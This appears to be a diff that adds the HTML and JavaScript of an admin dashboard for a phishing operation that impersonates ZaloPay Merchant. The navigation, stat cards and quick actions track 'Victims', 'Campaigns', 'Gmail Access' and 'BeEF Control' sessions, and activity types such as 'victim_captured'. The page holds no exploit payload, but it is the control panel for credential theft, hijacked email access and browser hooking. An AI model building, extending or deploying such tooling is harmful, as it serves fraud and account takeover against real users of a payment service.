@@ -1,0 +1,481 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard - ZaloPay Merchant</title>
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/x-icon" href="/favicon.ico">
+    
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    
+    <!-- Font Awesome -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    
+    <!-- Chart.js -->
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    
+    <!-- Custom CSS -->
+    <link href="/css/admin.css" rel="stylesheet">
+    
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <!-- Navigation -->
+    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
+<div class="container-fluid">
+            <a class="navbar-brand d-flex align-items-center" href="/admin/dashboard.html">
+                <img src="/images/zalopay-logo.png" alt="ZaloPay" height="32" class="me-2">
+                <span class="fw-bold">ZaloPay Admin</span>
+            </a>
+            
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+                <span class="navbar-toggler-icon"></span>
+    </button>
+
+            <div class="collapse navbar-collapse" id="navbarNav">
+                <ul class="navbar-nav me-auto">
+                    <li class="nav-item">
+                        <a class="nav-link active" href="/admin/dashboard.html">
+                            <i class="fas fa-tachometer-alt me-1"></i>Dashboard
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="/admin/victims.html">
+                            <i class="fas fa-users me-1"></i>Victims
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="/admin/campaigns.html">
+                            <i class="fas fa-bullhorn me-1"></i>Campaigns
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="/admin/gmail.html">
+                            <i class="fas fa-envelope me-1"></i>Gmail Access
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="/admin/beef.html">
+                            <i class="fas fa-bug me-1"></i>BeEF Control
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="/admin/logs.html">
+                            <i class="fas fa-list-alt me-1"></i>Activity Logs
+                        </a>
+                    </li>
+                </ul>
+                
+                <ul class="navbar-nav">
+                    <li class="nav-item dropdown">
+                        <a class="nav-link dropdown-toggle" href="#" id="notificationsDropdown" role="button" data-bs-toggle="dropdown">
+                            <i class="fas fa-bell me-1"></i>
+                            <span class="badge bg-danger" id="notificationBadge">0</span>
+                        </a>
+                        <ul class="dropdown-menu dropdown-menu-end" id="notificationsList">
+                            <li><h6 class="dropdown-header">Notifications</h6></li>
+                            <li><hr class="dropdown-divider"></li>
+                            <li><a class="dropdown-item" href="#" id="noNotifications">No new notifications</a></li>
+                        </ul>
+                    </li>
+                    
+                    <li class="nav-item dropdown">
+                        <a class="nav-link dropdown-toggle" href="#" id="userDropdown" role="button" data-bs-toggle="dropdown">
+                            <i class="fas fa-user-circle me-1"></i>
+                            <span id="userName">Admin User</span>
+                        </a>
+                        <ul class="dropdown-menu dropdown-menu-end">
+                            <li><a class="dropdown-item" href="/admin/profile.html">
+                                <i class="fas fa-user me-2"></i>Profile
+                            </a></li>
+                            <li><a class="dropdown-item" href="/admin/settings.html">
+                                <i class="fas fa-cog me-2"></i>Settings
+                            </a></li>
+                            <li><hr class="dropdown-divider"></li>
+                            <li><a class="dropdown-item" href="#" onclick="logout()">
+                                <i class="fas fa-sign-out-alt me-2"></i>Logout
+                            </a></li>
+                        </ul>
+                    </li>
+                </ul>
+        </div>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <div class="container-fluid py-4">
+        <!-- Page Header -->
+        <div class="row mb-4">
+            <div class="col-12">
+                <div class="d-flex justify-content-between align-items-center">
+                    <div>
+                        <h1 class="h3 mb-1">Dashboard</h1>
+                        <p class="text-muted mb-0">Tổng quan hệ thống ZaloPay Merchant</p>
+                            </div>
+                    <div class="d-flex gap-2">
+                        <button class="btn btn-outline-primary" onclick="refreshDashboard()">
+                            <i class="fas fa-sync-alt me-1"></i>Refresh
+                        </button>
+                        <button class="btn btn-primary" onclick="exportReport()">
+                            <i class="fas fa-download me-1"></i>Export Report
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Statistics Cards -->
+        <div class="row g-4 mb-4">
+            <div class="col-xl-3 col-md-6">
+                <div class="card stat-card border-0 shadow-sm">
+                <div class="card-body">
+                    <div class="d-flex align-items-center">
+                            <div class="stat-icon bg-primary text-white rounded-circle d-flex align-items-center justify-content-center me-3">
+                                <i class="fas fa-users fa-lg"></i>
+                            </div>
+                            <div>
+                                <h6 class="card-title text-muted mb-1">Total Victims</h6>
+                                <h3 class="mb-0" id="totalVictims">0</h3>
+                                <small class="text-success">
+                                    <i class="fas fa-arrow-up me-1"></i>
+                                    <span id="victimsGrowth">+0%</span> from last month
+                                </small>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+            <div class="col-xl-3 col-md-6">
+                <div class="card stat-card border-0 shadow-sm">
+                <div class="card-body">
+                    <div class="d-flex align-items-center">
+                            <div class="stat-icon bg-success text-white rounded-circle d-flex align-items-center justify-content-center me-3">
+                                <i class="fas fa-bullhorn fa-lg"></i>
+                            </div>
+                            <div>
+                                <h6 class="card-title text-muted mb-1">Active Campaigns</h6>
+                                <h3 class="mb-0" id="activeCampaigns">0</h3>
+                                <small class="text-success">
+                                    <i class="fas fa-arrow-up me-1"></i>
+                                    <span id="campaignsGrowth">+0%</span> from last month
+                                </small>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+            <div class="col-xl-3 col-md-6">
+                <div class="card stat-card border-0 shadow-sm">
+                <div class="card-body">
+                    <div class="d-flex align-items-center">
+                            <div class="stat-icon bg-warning text-white rounded-circle d-flex align-items-center justify-content-center me-3">
+                                <i class="fas fa-envelope fa-lg"></i>
+                            </div>
+                            <div>
+                                <h6 class="card-title text-muted mb-1">Gmail Accesses</h6>
+                                <h3 class="mb-0" id="gmailAccesses">0</h3>
+                                <small class="text-info">
+                                    <i class="fas fa-arrow-up me-1"></i>
+                                    <span id="gmailGrowth">+0%</span> from last month
+                                </small>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+            <div class="col-xl-3 col-md-6">
+                <div class="card stat-card border-0 shadow-sm">
+                    <div class="card-body">
+                        <div class="d-flex align-items-center">
+                            <div class="stat-icon bg-danger text-white rounded-circle d-flex align-items-center justify-content-center me-3">
+                                <i class="fas fa-bug fa-lg"></i>
+                    </div>
+                            <div>
+                                <h6 class="card-title text-muted mb-1">BeEF Sessions</h6>
+                                <h3 class="mb-0" id="beefSessions">0</h3>
+                                <small class="text-warning">
+                                    <i class="fas fa-arrow-up me-1"></i>
+                                    <span id="beefGrowth">+0%</span> from last month
+                                </small>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Charts Row -->
+        <div class="row g-4 mb-4">
+            <div class="col-xl-8">
+                <div class="card border-0 shadow-sm">
+                    <div class="card-header bg-white border-0">
+                        <div class="d-flex justify-content-between align-items-center">
+                            <h5 class="card-title mb-0">Victim Acquisition Trend</h5>
+                            <div class="btn-group btn-group-sm" role="group">
+                                <input type="radio" class="btn-check" name="chartPeriod" id="chart7d" autocomplete="off" checked>
+                                <label class="btn btn-outline-primary" for="chart7d">7D</label>
+                                
+                                <input type="radio" class="btn-check" name="chartPeriod" id="chart30d" autocomplete="off">
+                                <label class="btn btn-outline-primary" for="chart30d">30D</label>
+                                
+                                <input type="radio" class="btn-check" name="chartPeriod" id="chart90d" autocomplete="off">
+                                <label class="btn btn-outline-primary" for="chart90d">90D</label>
+                </div>
+                        </div>
+                    </div>
+                    <div class="card-body">
+                        <canvas id="victimTrendChart" height="300"></canvas>
+            </div>
+        </div>
+    </div>
+
+            <div class="col-xl-4">
+                <div class="card border-0 shadow-sm">
+                    <div class="card-header bg-white border-0">
+                        <h5 class="card-title mb-0">Victim Distribution</h5>
+                </div>
+                <div class="card-body">
+                        <canvas id="victimDistributionChart" height="300"></canvas>
+                         </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Recent Activity and Quick Actions -->
+        <div class="row g-4">
+            <div class="col-xl-8">
+                <div class="card border-0 shadow-sm">
+                    <div class="card-header bg-white border-0">
+                        <div class="d-flex justify-content-between align-items-center">
+                            <h5 class="card-title mb-0">Recent Activity</h5>
+                            <a href="/admin/logs.html" class="btn btn-sm btn-outline-primary">View All</a>
+                        </div>
+                </div>
+                <div class="card-body">
+                        <div id="recentActivityList">
+                            <div class="text-center py-4">
+                                <div class="spinner-border text-primary" role="status">
+                                    <span class="visually-hidden">Loading...</span>
+                                 </div>
+                             </div>
+                             </div>
+                                 </div>
+                             </div>
+                         </div>
+            
+            <div class="col-xl-4">
+                <div class="card border-0 shadow-sm">
+                    <div class="card-header bg-white border-0">
+                        <h5 class="card-title mb-0">Quick Actions</h5>
+                    </div>
+                    <div class="card-body">
+                        <div class="d-grid gap-2">
+                            <button class="btn btn-outline-primary" onclick="createCampaign()">
+                                <i class="fas fa-plus me-2"></i>Create Campaign
+                            </button>
+                            <button class="btn btn-outline-success" onclick="viewVictims()">
+                                <i class="fas fa-users me-2"></i>View Victims
+                            </button>
+                            <button class="btn btn-outline-warning" onclick="accessGmail()">
+                                <i class="fas fa-envelope me-2"></i>Gmail Access
+                            </button>
+                            <button class="btn btn-outline-danger" onclick="controlBeEF()">
+                                <i class="fas fa-bug me-2"></i>BeEF Control
+                            </button>
+                            <button class="btn btn-outline-info" onclick="viewReports()">
+                                <i class="fas fa-chart-bar me-2"></i>View Reports
+                            </button>
+                        </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+    <!-- Bootstrap JS -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+
+    <!-- Custom JS -->
+    <script src="/js/admin.js"></script>
+    <script src="/js/websocket-client.js"></script>
+    <script src="/js/dashboard-charts.js"></script>
+
+<script>
+        // Initialize dashboard
+        document.addEventListener('DOMContentLoaded', function() {
+            initializeDashboard();
+        });
+
+        // Dashboard functions
+        function initializeDashboard() {
+            loadDashboardData();
+            initializeWebSocket();
+            initializeCharts();
+        }
+
+        function loadDashboardData() {
+            // Load statistics
+            fetch('/api/admin/dashboard/stats')
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        updateStatistics(data);
+                    }
+                })
+                .catch(error => {
+                    console.error('Error loading dashboard stats:', error);
+                });
+
+            // Load recent activity
+            fetch('/api/admin/activity_logs/recent-activity?limit=10')
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        updateRecentActivity(data.activities);
+                    }
+                })
+                .catch(error => {
+                    console.error('Error loading recent activity:', error);
+                });
+        }
+
+        function updateStatistics(data) {
+            document.getElementById('totalVictims').textContent = data.total_victims || 0;
+            document.getElementById('activeCampaigns').textContent = data.active_campaigns || 0;
+            document.getElementById('gmailAccesses').textContent = data.total_gmail_accesses || 0;
+            document.getElementById('beefSessions').textContent = data.total_beef_sessions || 0;
+        }
+
+        function updateRecentActivity(activities) {
+            const container = document.getElementById('recentActivityList');
+            
+            if (activities.length === 0) {
+                container.innerHTML = '<div class="text-center py-4 text-muted">No recent activity</div>';
+                return;
+            }
+
+            container.innerHTML = activities.map(activity => `
+                <div class="activity-item d-flex align-items-start mb-3">
+                    <div class="activity-icon bg-${getActivityColor(activity.action_type)} text-white rounded-circle d-flex align-items-center justify-content-center me-3">
+                        <i class="fas fa-${getActivityIcon(activity.action_type)} fa-sm"></i>
+                    </div>
+                    <div class="flex-grow-1">
+                        <div class="activity-content">
+                            <p class="mb-1">${activity.description}</p>
+                            <small class="text-muted">
+                                <i class="fas fa-clock me-1"></i>
+                                ${formatTimeAgo(activity.timestamp)}
+                            </small>
+                        </div>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        function getActivityColor(actionType) {
+            const colors = {
+                'victim_captured': 'success',
+                'campaign_created': 'primary',
+                'gmail_access': 'warning',
+                'beef_session': 'danger',
+                'system_alert': 'info'
+            };
+            return colors[actionType] || 'secondary';
+        }
+
+        function getActivityIcon(actionType) {
+            const icons = {
+                'victim_captured': 'user-plus',
+                'campaign_created': 'bullhorn',
+                'gmail_access': 'envelope',
+                'beef_session': 'bug',
+                'system_alert': 'exclamation-triangle'
+            };
+            return icons[actionType] || 'info-circle';
+        }
+
+        function formatTimeAgo(timestamp) {
+            const now = new Date();
+            const time = new Date(timestamp);
+            const diff = now - time;
+            
+            const minutes = Math.floor(diff / 60000);
+            const hours = Math.floor(diff / 3600000);
+            const days = Math.floor(diff / 86400000);
+            
+            if (minutes < 1) return 'Just now';
+            if (minutes < 60) return `${minutes}m ago`;
+            if (hours < 24) return `${hours}h ago`;
+            return `${days}d ago`;
+        }
+
+        function refreshDashboard() {
+            loadDashboardData();
+            showNotification('Dashboard refreshed', 'success');
+        }
+
+        function exportReport() {
+            // Implement report export
+            showNotification('Report export started', 'info');
+        }
+
+        function createCampaign() {
+            window.location.href = '/admin/campaigns.html?action=create';
+        }
+
+        function viewVictims() {
+            window.location.href = '/admin/victims.html';
+        }
+
+        function accessGmail() {
+            window.location.href = '/admin/gmail.html';
+        }
+
+        function controlBeEF() {
+            window.location.href = '/admin/beef.html';
+        }
+
+        function viewReports() {
+            window.location.href = '/admin/reports.html';
+        }
+
+        function logout() {
+            if (confirm('Are you sure you want to logout?')) {
+                // Clear session
+                localStorage.removeItem('admin_token');
+                localStorage.removeItem('admin_user');
+                
+                // Redirect to login
+                window.location.href = '/admin/login.html';
+            }
+        }
+
+        function showNotification(message, type = 'info') {
+            // Create notification element
+            const notification = document.createElement('div');
+            notification.className = `alert alert-${type} alert-dismissible fade show position-fixed`;
+            notification.style.cssText = 'top: 20px; right: 20px; z-index: 9999; min-width: 300px;';
+            notification.innerHTML = `
+                ${message}
+                <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
+            `;
+            
+            document.body.appendChild(notification);
+            
+            // Auto remove after 5 seconds
+                setTimeout(() => {
+                if (notification.parentNode) {
+                    notification.remove();
+                }
+            }, 5000);
+        }
+</script>
+</body>
+</html>
